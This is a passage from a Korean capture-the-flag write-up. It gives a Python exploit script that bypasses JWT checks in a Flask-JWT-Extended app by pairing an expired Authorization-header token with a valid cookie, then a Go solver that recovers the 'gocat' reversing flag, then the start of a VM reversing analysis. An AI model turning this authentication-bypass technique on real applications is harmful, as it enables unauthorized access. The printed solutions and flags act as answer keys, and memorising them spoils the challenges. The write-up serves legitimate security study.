</span><span class="k">def</span> <span class="nf">_decode_jwt_from_request</span><span class="p">(</span><span class="n">request_type</span><span class="p">):</span>
    <span class="c1"># All the places we can get a JWT from in this request
</span>    <span class="n">get_encoded_token_functions</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">locations</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">token_location</span>

    <span class="c1"># add the functions in the order specified in JWT_TOKEN_LOCATION
</span>    <span class="k">for</span> <span class="n">location</span> <span class="ow">in</span> <span class="n">locations</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'cookies'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
                <span class="k">lambda</span><span class="p">:</span> <span class="n">_decode_jwt_from_cookies</span><span class="p">(</span><span class="n">request_type</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'query_string'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">_decode_jwt_from_query_string</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'headers'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">_decode_jwt_from_headers</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">location</span> <span class="o">==</span> <span class="s">'json'</span><span class="p">:</span>
            <span class="n">get_encoded_token_functions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
                <span class="k">lambda</span><span class="p">:</span> <span class="n">_decode_jwt_from_json</span><span class="p">(</span><span class="n">request_type</span><span class="p">))</span>

    <span class="c1"># Try to find the token from one of these locations. It only needs to exist
</span>    <span class="c1"># in one place to be valid (not every location).
</span>    <span class="n">errors</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">decoded_token</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">jwt_header</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">get_encoded_token_function</span> <span class="ow">in</span> <span class="n">get_encoded_token_functions</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">get_encoded_token_function</span><span class="p">()</span>
            <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>
            <span class="n">jwt_header</span> <span class="o">=</span> <span class="n">get_unverified_jwt_headers</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="n">NoAuthorizationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">errors</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

    <span class="c1"># Do some work to make a helpful and human readable error message if no
</span>    <span class="c1"># token was found in any of the expected locations.
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">decoded_token</span><span class="p">:</span>
        <span class="n">token_locations</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">token_location</span>
        <span class="n">multiple_jwt_locations</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">token_locations</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span>

        <span class="k">if</span> <span class="n">multiple_jwt_locations</span><span class="p">:</span>
            <span class="n">err_msg</span> <span class="o">=</span> <span class="s">"Missing JWT in {start_locs} or {end_locs} ({details})"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span>
                <span class="n">start_locs</span><span class="o">=</span><span class="s">", "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">token_locations</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
                <span class="n">end_locs</span><span class="o">=</span><span class="n">token_locations</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span>
                <span class="n">details</span><span class="o">=</span><span class="s">"; "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">errors</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="k">raise</span> <span class="n">NoAuthorizationError</span><span class="p">(</span><span class="n">err_msg</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">NoAuthorizationError</span><span class="p">(</span><span class="n">errors</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

    <span class="n">verify_token_type</span><span class="p">(</span><span class="n">decoded_token</span><span class="p">,</span> <span class="n">expected_type</span><span class="o">=</span><span class="n">request_type</span><span class="p">)</span>
    <span class="n">verify_token_not_blacklisted</span><span class="p">(</span><span class="n">decoded_token</span><span class="p">,</span> <span class="n">request_type</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">decoded_token</span><span class="p">,</span> <span class="n">jwt_header</span>
</code></pre></div></div>

<ul>
  <li>위와 같이 for 반복문을 이용하여 <strong><code class="highlighter-rouge">location</code></strong> 토큰이 있을 것이라 미리 선언되어 있던 위치를 모두 확인하여 <strong><code class="highlighter-rouge">get_encoded_token_functions</code></strong>에 append 한다. 이때 location은 config.py에 <strong>JWT_TOKEN_LOCATION</strong>으로 선언하거나 <strong>app.config[‘JWT_TOKEN_LOCATION’]</strong>에 선언할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">get_encoded_token_function</span> <span class="ow">in</span> <span class="n">get_encoded_token_functions</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">get_encoded_token_function</span><span class="p">()</span>
            <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>
            <span class="n">jwt_header</span> <span class="o">=</span> <span class="n">get_unverified_jwt_headers</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="n">NoAuthorizationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">errors</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</code></pre></div></div>

<ul>
  <li>이때 위와 같이 get_encoded_token_functions에 append된 모든 위치에서 토큰을 파싱하는 것이 아니라 append된 순서대로 token을 검사하되, <strong>하나가 정상적으로 파싱되었을 경우, 뒤의 토큰은 무시하도록 코드가 작성</strong>되어 있다.  따라서 토큰의 위치가 여러 곳으로 지정할 경우 로지컬한 취약점이 발생할 수 있고, 이번 문제의 컨셉 또한 이와 동일하다.</li>
  <li>다시 문제로 돌아와 눈여겨봐야 할 것은 <strong>app.config[‘JWT_TOKEN_LOCATION’]</strong>이다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="n">app_context</span><span class="p">():</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_SECRET_KEY'</span><span class="p">]</span>     <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET'</span><span class="p">]</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_TOKEN_LOCATION'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cookies'</span><span class="p">,</span> <span class="s">'headers'</span><span class="p">]</span>
        <span class="n">jwtmanager</span>                       <span class="o">=</span> <span class="n">JWTManager</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">app</span>
</code></pre></div></div>

<ul>
  <li>JWT 토큰의 위치가 cookies, 그리고 headers로 되어 있다. <strong><code class="highlighter-rouge">jwt_required</code></strong>와 <code class="highlighter-rouge">**get_jwt_identity()**</code>에서는 cookies에 선언된 JWT Token을 통해 검증하게 된다. 그러나 인위적으로 Authorization 헤더를 통해 검증하는 곳에서는 <strong><code class="highlighter-rouge">_decode_jwt_from_request</code></strong>에서 return하는 토큰과는 다르다.</li>
  <li>이와 같은 검사 루틴을 통해 검증할 경우 로지컬한 취약점이 발생할 수 있기 때문에 Flask-JWT-Extended의 경우 해당 모듈에서 제공하는 함수로 토큰 검사 및 검증 값을 반환할 수 있도록 하는 것이 권장된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># exploit.py
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="c1"># Get Token
</span><span class="n">url</span>     <span class="o">=</span> <span class="s">"http://ctf.kkamikoon.com/"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span>  <span class="p">:</span> <span class="s">"application/json; charset=utf-8"</span> <span class="p">}</span>
<span class="n">data</span>    <span class="o">=</span> <span class="p">{</span> <span class="s">"username"</span>      <span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
            <span class="s">"password"</span>      <span class="p">:</span> <span class="s">"admin"</span> <span class="p">}</span>

<span class="n">res</span>     <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s">"login"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">new</span>     <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'access_token'</span><span class="p">]</span>

<span class="c1"># Expired JWT == Exploit JWT
</span><span class="n">exploit_jwt</span>     <span class="o">=</span> <span class="s">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTc4NTc4MzcsIm5iZiI6MTU5Nzg1NzgzNywianRpIjoiMzQyYjNlZTItMzQ1My00Y2IzLWFjYzgtZjMxMzcyYjU3NGEwIiwiZXhwIjoxNTk3ODU3ODAwLCJpZGVudGl0eSI6Imd1ZXN0IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRmNGE4YTk3LTdiNDEtNGZiMy1iYzcxLTE0YjBiODM3ZmQyNSJ9.pJYyoZjq-6l06TQ6ugfQZjoHtSClEhW_6AvXzYjAQM8"</span> <span class="c1"># expired
</span><span class="n">exploit_headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"Authorization"</span> <span class="p">:</span> <span class="s">f"Bearer </span><span class="si">{</span><span class="n">exploit_jwt</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
    <span class="s">"Cookie"</span>        <span class="p">:</span> <span class="s">f"access_token_cookie=</span><span class="si">{</span><span class="n">new</span><span class="si">}</span><span class="s">"</span>
<span class="p">}</span>

<span class="n">res</span>     <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s">"flag"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">exploit_headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p><br /></p>

<h1 id="️-reversing">🖥️ REVERSING</h1>

<h2 id="gocat">gocat</h2>

<hr />

<p><img src="/assets/bob/bob945.png" alt="/assets/bob/bob945.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>golang 리버싱 &amp; 간단한 역연산 / 0 solver
</code></pre></div></div>
<ul>
  <li>주어진 문제 파일을 다운로드받고 바이너리를 ida로 열게되면 아래와 같이 심볼이 살아있지 않은 것처럼 보인다.</li>
</ul>

<p><img src="/assets/bob/bob946.png" alt="/assets/bob/bob946.png" /></p>

<ul>
  <li>하지만 golang은 코드 작성시 사용한 패키지와 여러 함수에 대한 정보들을 <code class="highlighter-rouge">gopclntab</code> 섹션에 저장한다. 해당 섹션에 저장 시, 아래와 같은 구조체를 가진다.</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">_FUNCTIONINFO</span> <span class="p">{</span>
	<span class="n">QDWORD</span> <span class="n">lpFunctionAddr</span><span class="p">,</span>
	<span class="n">QDWORD</span> <span class="n">qdNameOffset</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>따라서, 해당 섹션의 구조체를 파싱해서 오디팅을 진행하면 된다. 하지만 이 작업들은 너무 많은 노동이 필요하므로 누군가 만들어놓은 <a href="https://github.com/strazzere/golang_loader_assist">ida golang assist</a>를 사용하면 아래의 그림과 같이 비교적 깔끔한 함수명을 확인 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob947.png" alt="/assets/bob/bob947.png" /></p>

<ul>
  <li>위와 같이 assist를 사용해 함수명을 바꿔준 이후, main_main함수를 찾아서 디컴파일한다.</li>
</ul>

<p><img src="/assets/bob/bob948.png" alt="/assets/bob/bob948.png" /></p>

<ul>
  <li>main_main함수를 대략적으로 살펴보면 어느정도 구조가 눈에 들어오게 되는데 다음과 같은 pseudo code로 되어있음을 알 수 있고, 역연산이 충분히 가능한 구조인 것 또한 알 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># pseudo code
</span><span class="n">seed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">unixtime</span><span class="p">()</span>
<span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
	<span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span>

<span class="n">flag</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">44</span><span class="p">:</span>
	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
	<span class="n">result</span> <span class="o">+=</span> <span class="p">[</span> <span class="n">getRandom</span><span class="p">()</span> <span class="o">*</span> <span class="n">table</span><span class="p">[</span><span class="n">getIndex</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</code></pre></div></div>

<ul>
  <li>여기서 추가적으로 분석해야할 것은 getIndex함수인데, 해당 함수를 살펴보면 다음과 같다.</li>
</ul>

<p><img src="/assets/bob/bob949.png" alt="/assets/bob/bob949.png" /></p>

<ul>
  <li>재귀적으로 호출하는 것을 볼 수 있는데, 정상적으로 디컴파일이 되지 않는다. 이러한 이유 때문에 어셈 코드를 보아야한다.</li>
</ul>

<p><img src="/assets/bob/bob950.png" alt="/assets/bob/bob950.png" /></p>

<p><img src="/assets/bob/bob951.png" alt="/assets/bob/bob951.png" /></p>

<ul>
  <li>위의 두 그림에서 볼 수 있듯, eax가 getIndex함수에서 스택으로 들어가는 것을 확인할 수 있고 대략적으로 아래와 같이 동작하는 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getIndex</span><span class="p">(</span><span class="n">depth</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">depth</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
		<span class="k">return</span> <span class="mi">1</span>
	<span class="k">return</span> <span class="p">(</span><span class="n">getIndex</span><span class="p">(</span><span class="n">depth</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">depth</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
</code></pre></div></div>

<ul>
  <li>위의 식대로 계산을 하면 피보나치 수열임을 알 수 있는데, 이를 재귀적으로 구현했기 때문에 40번째 수열 값을 계산하기 위해서 적지않은 계산이 필요하게 된다. 그러므로 memorization 이나 간단하게 미리 배열로 계산을 해주면 된다.</li>
  <li>위의 작업들을 모두 합쳐서, 역연산을 하기 위한 poc를 작성하면 다음과 같다.</li>
</ul>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
   <span class="s">"fmt"</span>
   <span class="s">"math/rand"</span>
   <span class="s">"time"</span>
<span class="p">)</span>
<span class="k">var</span> <span class="n">memory</span> <span class="p">[]</span><span class="kt">int</span>

<span class="k">func</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
   <span class="k">if</span> <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">!=</span> <span class="m">0</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="m">2</span> <span class="p">{</span>
      <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="m">1</span>
      <span class="k">return</span> <span class="m">1</span>
   <span class="p">}</span>
   <span class="n">result</span> <span class="o">:=</span> <span class="p">(</span><span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="m">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="m">1</span><span class="p">))</span> <span class="o">&amp;</span> <span class="m">0xFF</span>
   <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
   <span class="k">return</span> <span class="n">result</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span> <span class="o">*</span><span class="n">rand</span><span class="o">.</span><span class="n">Rand</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
   <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">Int</span><span class="p">()</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">memory</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">int</span><span class="p">,</span> <span class="m">0x100</span><span class="p">)</span>
   <span class="n">flag_enc</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">uint32</span><span class="p">{</span>
<span class="m">2069409670</span><span class="p">,</span> <span class="m">2964128287</span><span class="p">,</span> <span class="m">2354096995</span><span class="p">,</span> <span class="m">3032984546</span><span class="p">,</span> <span class="m">10510900</span><span class="p">,</span> <span class="m">2544990927</span><span class="p">,</span> <span class="m">2926778951</span><span class="p">,</span> <span class="m">552570446</span><span class="p">,</span> <span class="m">1853857527</span><span class="p">,</span> <span class="m">3973419442</span><span class="p">,</span> <span class="m">3048538325</span><span class="p">,</span> <span class="m">1902664467</span><span class="p">,</span> <span class="m">420185447</span><span class="p">,</span> <span class="m">2658384181</span><span class="p">,</span> <span class="m">2929871612</span><span class="p">,</span> <span class="m">4151170943</span><span class="p">,</span> <span class="m">7446955</span><span class="p">,</span> <span class="m">2503536331</span><span class="p">,</span> <span class="m">1899187641</span><span class="p">,</span> <span class="m">3227466824</span><span class="p">,</span> <span class="m">3596188763</span><span class="p">,</span> <span class="m">2770886128</span><span class="p">,</span> <span class="m">3598361089</span><span class="p">,</span> <span class="m">3417226313</span><span class="p">,</span> <span class="m">2440643422</span><span class="p">,</span> <span class="m">157914802</span><span class="p">,</span> <span class="m">380458138</span><span class="p">,</span> <span class="m">2585576567</span><span class="p">,</span> <span class="m">3413857472</span><span class="p">,</span> <span class="m">2292452225</span><span class="p">,</span> <span class="m">2949469921</span><span class="p">,</span> <span class="m">3191119812</span><span class="p">,</span> <span class="m">3830151779</span><span class="p">,</span> <span class="m">783135889</span><span class="p">,</span> <span class="m">801108861</span><span class="p">,</span> <span class="m">50993623</span><span class="p">,</span> <span class="m">2780019976</span><span class="p">,</span> <span class="m">283706417</span><span class="p">,</span> <span class="m">64541485</span><span class="p">,</span> <span class="m">3786109553</span><span class="p">,</span> <span class="m">4159600537</span><span class="p">,</span> <span class="m">2979925216</span><span class="p">,</span> <span class="m">3157377353</span><span class="p">,</span> <span class="m">420734285</span><span class="p">,</span>
   <span class="p">}</span>
   <span class="k">for</span> <span class="n">unix</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">Unix</span><span class="p">();</span> <span class="n">unix</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">;</span> <span class="n">unix</span><span class="o">--</span> <span class="p">{</span>
      <span class="n">r</span> <span class="o">:=</span> <span class="n">rand</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="n">rand</span><span class="o">.</span><span class="n">NewSource</span><span class="p">(</span><span class="n">unix</span><span class="p">))</span>
      <span class="n">table</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">uint8</span><span class="p">,</span> <span class="m">0x100</span><span class="p">)</span>

      <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
         <span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint8</span><span class="p">(</span><span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
      <span class="p">}</span>
      <span class="n">prefix</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"bob"</span><span class="p">)</span>
      <span class="n">found</span> <span class="o">:=</span> <span class="no">true</span>

      <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
         <span class="n">calc</span> <span class="o">:=</span> <span class="kt">int</span><span class="p">(</span><span class="n">prefix</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="kt">int</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">getIndex</span><span class="p">(((</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">%</span> <span class="m">256</span><span class="p">))])</span> <span class="o">*</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
         <span class="k">if</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">calc</span><span class="p">)</span> <span class="o">!=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">{</span>
            <span class="n">found</span> <span class="o">=</span> <span class="no">false</span>
            <span class="k">break</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="n">found</span> <span class="o">==</span> <span class="no">true</span> <span class="p">{</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Found flag"</span><span class="p">)</span>
         <span class="n">flag</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">))</span>
         <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">);</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
            <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kt">byte</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">-</span> <span class="kt">int</span><span class="p">(</span><span class="n">table</span><span class="p">[(</span><span class="n">getIndex</span><span class="p">((</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="m">256</span><span class="p">)))])</span> <span class="o">*</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
         <span class="p">}</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"flag =&gt; "</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span> <span class="o">+</span> <span class="kt">string</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
         <span class="k">return</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>flag: bob{DO_NOT_USING_GOLANG_PLZ_JUST_KEEP_GOING}</p>

<p><br /></p>

<p><br /></p>

<h2 id="bvm-rev">bvm-rev</h2>

<hr />

<p><img src="/assets/bob/bob952.png" alt="/assets/bob/bob952.png" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvm 바이너리에서 로드하는 flag.bvm의 코드 흐름 분석
</code></pre></div></div>
<p><img src="/assets/bob/bob953.png" alt="/assets/bob/bob953.png" /></p>

<p>bvm 파일은 위 그림과 같은 구조를 가지고, 각 섹션은 코드 영역, 데이터 영역, 변수 영역 등으로 사용된다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">CALLSTACK</span> <span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">reg</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="kt">uint16_t</span> <span class="n">retaddr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">BVM</span> <span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">section</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">uint8_t</span> <span class="mi">32</span><span class="p">;</span>
    <span class="kt">int8_t</span> <span class="n">zf</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">CALLSTACK</span> <span class="n">callstack</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
    <span class="kt">int8_t</span> <span class="n">cs_count</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
    <span class="kt">uint16_t</span> <span class="n">reg</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">//ax, bx, cx, dx</span>
    <span class="kt">uint16_t</span> <span class="n">pc</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>각 opcode가 어떤 동작을 하는지 파악하기 위해서는 구조체를 정의하고 분석하는 것이 편하다.</p>

<p>그리고 분석을 통해 아래의 몇가지 사실을 알 수 있다.</p>

<ol>
  <li>4개의 register(ax, bx, cx, dx)를 사용하고 각 레지스터와 모든 연산처리는 2bytes 크기를 가진다.</li>
  <li>CALL instruction을 호출할 때 register와 돌아올 주소를 백업하고, RETURN을 만나면 ax register를 제외한 register를 복원하고 돌아올 주소로 pc를 변경한다.</li>
  <li>경계(boundary)를 넘어서는 참조가 발견되면 프로그램이 종료된다. (일부 opcode에서는 경계 검사를 하지 않는다)</li>
</ol>

